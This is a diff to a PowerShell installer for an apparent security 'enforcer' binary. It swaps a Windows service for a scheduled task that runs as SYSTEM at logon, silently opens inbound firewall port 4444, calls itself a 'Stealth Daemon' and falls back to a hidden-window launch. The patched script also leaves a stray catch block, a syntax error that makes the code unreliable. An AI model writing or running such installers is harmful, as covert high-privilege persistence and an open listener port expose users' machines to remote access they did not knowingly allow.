@@ -91,28 +91,41 @@ if ($CurrentPath -notlike "*$BinDir*") {
     $env:Path += ";$BinDir"
 }
 
-# 7. Setup Background Enforcer Service
+# 7. Setup Background Enforcer Daemon (Scheduled Task)
 Write-Host "⚙️  Configuring Prometheus Stealth Daemon..." -ForegroundColor Cyan
-$ServiceName = "PrometheusEnforcer"
+$TaskName = "PrometheusEnforcer"
+$Binary = "$BinDir\prometheus-enforcer.exe"
 
-# Check if service exists
-$ExistingService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
+# Open Firewall for Admin UI
+try {
+    Write-Host "🛡️  Configuring Security Firewall..." -ForegroundColor Gray
+    New-NetFirewallRule -DisplayName "Prometheus Admin Dashboard" -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
+} catch {}
+
+# Unregister old service if it exists
+$ExistingService = Get-Service -Name "PrometheusEnforcer" -ErrorAction SilentlyContinue
 if ($ExistingService) {
-    Write-Host "   Updating existing service..." -ForegroundColor Gray
-    Stop-Service -Name $ServiceName -ErrorAction SilentlyContinue
-} else {
-    Write-Host "   Registering new system service..." -ForegroundColor Gray
-    New-Service -Name $ServiceName `
-                -BinaryPathName "`"$BinDir\prometheus-enforcer.exe`"" `
-                -DisplayName "Prometheus Security Enforcer" `
-                -Description "Enterprise-grade web and application security enforcer for Prometheus Suite." `
-                -StartupType Automatic
+    Stop-Service -Name "PrometheusEnforcer" -ErrorAction SilentlyContinue
+    sc.exe delete "PrometheusEnforcer" | Out-Null
 }
 
-# Start the service
+# Unregister old task if it exists
+Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+
+# Register new Task (Run as SYSTEM for global enforcement)
+$Action = New-ScheduledTaskAction -Execute $Binary
+$Trigger = New-ScheduledTaskTrigger -AtLogOn
+$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest | Out-Null
+
+# Start the Task immediately
 try {
-    Start-Service -Name $ServiceName
-    Write-Host "🚀 Security Daemon Active." -ForegroundColor Green
+    Start-ScheduledTask -TaskName $TaskName
+    Write-Host "🚀 Security Daemon Active & Safeguarded." -ForegroundColor Green
+} catch {
+    Write-Host "⚠️  Could not auto-start. Launching manual node..." -ForegroundColor Yellow
+    Start-Process $Binary -WindowStyle Hidden
+}
 } catch {
     Write-Host "⚠️  Could not start service automatically. Ensure you are running as Admin." -ForegroundColor Yellow
 }
